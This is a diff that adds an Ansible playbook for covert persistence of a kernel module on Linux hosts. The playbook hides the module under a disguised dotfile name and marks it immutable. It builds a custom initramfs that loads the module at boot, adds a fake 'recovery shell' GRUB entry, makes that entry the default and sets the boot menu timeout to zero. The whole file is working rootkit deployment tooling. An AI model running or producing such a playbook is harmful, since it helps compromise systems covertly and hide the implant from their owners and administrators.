@@ -1,0 +1,85 @@
+---
+- name: Deploy stealthy kernel module with initramfs persistence
+  hosts: all
+  become: true
+  vars:
+    kernel_module_path: "/tmp/hidden_module.ko"
+    module_dest_dir: "/usr/lib/x86_64-linux-gnu/security"
+    module_hidden_name: ".libcrypto-helper.ko"
+    initramfs_name: ".initrd-recovery-backup.gz"
+    initramfs_path: "/boot/{{ initramfs_name }}"
+    grub_custom_entry: |
+      menuentry 'Ubuntu (recovery shell)' {
+        set root='hd0,msdos1'
+        linux /boot/vmlinuz-{{ ansible_kernel }} root=/dev/sda1 ro quiet
+        initrd /boot/{{ initramfs_name }}
+      }
+
+  tasks:
+    - name: Create hidden destination for module
+      file:
+        path: "{{ module_dest_dir }}"
+        state: directory
+        mode: '0755'
+
+    - name: Copy kernel module to disguised location
+      copy:
+        src: "{{ kernel_module_path }}"
+        dest: "{{ module_dest_dir }}/{{ module_hidden_name }}"
+        mode: '0644'
+
+    - name: Make .ko file immutable (stealth)
+      command: "chattr +i {{ module_dest_dir }}/{{ module_hidden_name }}"
+
+    - name: Create temporary working directory
+      file:
+        path: /tmp/custom_initramfs
+        state: directory
+
+    - name: Copy module into initramfs directory
+      copy:
+        src: "{{ module_dest_dir }}/{{ module_hidden_name }}"
+        dest: /tmp/custom_initramfs/hidden_module.ko
+
+    - name: Create minimal init script
+      copy:
+        dest: /tmp/custom_initramfs/init
+        mode: '0755'
+        content: |
+          #!/bin/sh
+          mount -t proc none /proc
+          insmod /hidden_module.ko
+          exec /sbin/init
+
+    - name: Create initramfs archive
+      command: >
+        bash -c "cd /tmp/custom_initramfs && find . | cpio -H newc -o | gzip > {{ initramfs_path }}"
+
+    - name: Make initramfs archive immutable
+      command: "chattr +i {{ initramfs_path }}"
+
+    - name: Ensure GRUB custom menuentry is present
+      blockinfile:
+        path: /etc/grub.d/40_custom
+        marker: "# {mark} HIDDEN INITRAMFS"
+        block: "{{ grub_custom_entry }}"
+
+    - name: Update GRUB configuration
+      command: update-grub
+
+    - name: Set default GRUB entry to recovery shell
+      command: grub-set-default 'Ubuntu (recovery shell)'
+
+    - name: Set GRUB timeout to 0 (hide menu)
+      lineinfile:
+        path: /etc/default/grub
+        regexp: '^GRUB_TIMEOUT='
+        line: 'GRUB_TIMEOUT=0'
+
+    - name: Update GRUB again to apply timeout change
+      command: update-grub
+
+    - name: Clean up temporary directory
+      file:
+        path: /tmp/custom_initramfs
+        state: absent
